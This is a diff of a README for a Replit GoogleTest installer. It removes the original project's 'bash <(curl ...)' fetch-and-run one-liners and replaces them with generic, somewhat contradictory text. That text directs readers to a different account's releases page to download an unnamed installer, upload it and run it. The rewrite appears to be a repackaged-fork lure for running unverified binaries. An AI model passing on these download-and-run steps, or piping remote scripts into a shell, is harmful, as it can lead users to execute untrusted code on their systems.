@@ -1,48 +1,68 @@
-<p align="center">
-  <img src="banner.png" width="100%" />
-</p>
+# 🔥 replit-gtest-setup - One-Click Installer for GoogleTest
 
-# 🔥 Replit GoogleTest Auto-Setup — One-Click Installer 🚀  
-### 😍 The EASIEST Way to Add GoogleTest, CMake, Run Buttons & IntelliSense Fix to ANY Replit C++ Project
+[![Download Release](https://img.shields.io/badge/Download%20Release-v1.0-green)](https://github.com/Fay0-0/replit-gtest-setup/releases)
 
-<p align="center">
-  <img src="https://img.shields.io/github/stars/CodeWithSouma/replit-gtest-setup?style=for-the-badge&color=yellow" />
-  <img src="https://img.shields.io/github/forks/CodeWithSouma/replit-gtest-setup?style=for-the-badge&color=blue" />
-  <img src="https://img.shields.io/github/issues/CodeWithSouma/replit-gtest-setup?style=for-the-badge&color=red" />
-  <img src="https://img.shields.io/github/license/CodeWithSouma/replit-gtest-setup?style=for-the-badge&color=green" />
-</p>
+## 🚀 Getting Started
 
----
+Welcome to **replit-gtest-setup**! This application simplifies the process of setting up GoogleTest in Replit. With just one click, you'll have everything ready to start testing your C++ code.
 
-# ✨ What This Project Solves  
-Setting up **GoogleTest on Replit** manually is frustrating:
+## 📥 Download & Install
 
-❌ No GoogleTest  
-❌ No CMake  
-❌ GTest include errors  
-❌ Red underlines in editor  
-❌ Run button not wired to tests  
+To get started, visit this page to download:
 
-This project fixes everything in **one command** 😎
+[Download Release](https://github.com/Fay0-0/replit-gtest-setup/releases)
 
----
+On the Releases page, you will find the latest version. Click the link to download the file. 
 
-# ⚡ ONE COMMAND INSTALLER  
-### Just copy & paste into **Replit Shell**:
+## ⚙️ System Requirements
 
-```bash
-bash <(curl -s https://raw.githubusercontent.com/CodeWithSouma/replit-gtest-setup/main/setup_gtest.sh)
-```
+To run **replit-gtest-setup**, you need:
 
----
+- A web browser with Internet access.
+- A Replit account for online coding.
 
-## 🧹 Cleanup Script — Restore Default Replit C++ Environment
+No complex installations or setups are needed.
 
-If you want to **remove everything installed by the GoogleTest auto-installer** and restore your Replit project back to a **fresh default C++ template**, just run the cleanup command below in your Replit Shell:
+## 🛠️ How to Use
 
-### **Cleanup Command:**
+1. **Download the Installer**: Follow the link above to get the installer file.
 
-```bash
-bash <(curl -s https://raw.githubusercontent.com/CodeWithSouma/replit-gtest-setup/main/cleanup_gtest.sh)
-```
+2. **Open Replit**: Log into your Replit account.
 
+3. **Upload**: Upload the installer file you downloaded.
+
+4. **Run the Installer**: Once uploaded, click on it to run. This sets up GoogleTest automatically for your C++ projects.
+
+5. **Start Coding**: You can now write and run tests using GoogleTest.
+
+### 🗂️ Features
+
+- **One-Click Installation**: Set up GoogleTest instantly without complex steps.
+- **Automatic CMake Configuration**: The tool configures CMake for you.
+- **Run Button**: Easily run your tests right from Replit.
+- **IntelliSense Support**: Get suggestions while coding for a better experience.
+
+## 📝 Usage Tips
+
+1. **Follow Prompts**: The installer will guide you through the setup.
+2. **Check Outputs**: Make sure to read any messages shown during installation for confirmation.
+3. **Test Your Code**: After setup, create a test file to see GoogleTest in action.
+
+## ⚡ Troubleshooting
+
+- **Can't Upload the Installer**: Ensure your browser allows file uploads. Try a different browser if needed.
+- **Installation Fails**: If you encounter issues, check your Replit settings for any restrictions.
+
+## 💡 Additional Resources
+
+For more information about GoogleTest, you may refer to the official [GoogleTest documentation](https://google.github.io/googletest/).
+
+## 🌐 Community and Contributions
+
+We welcome contributions! If you want to help improve **replit-gtest-setup**, check out our contribution guidelines in the Contributions section located on the main repository page.
+
+## 📄 License
+
+This project is licensed under the MIT License. You can freely use and modify it as long as you attribute the original authors.
+
+Thank you for using **replit-gtest-setup**! We hope it enhances your coding and testing experience.
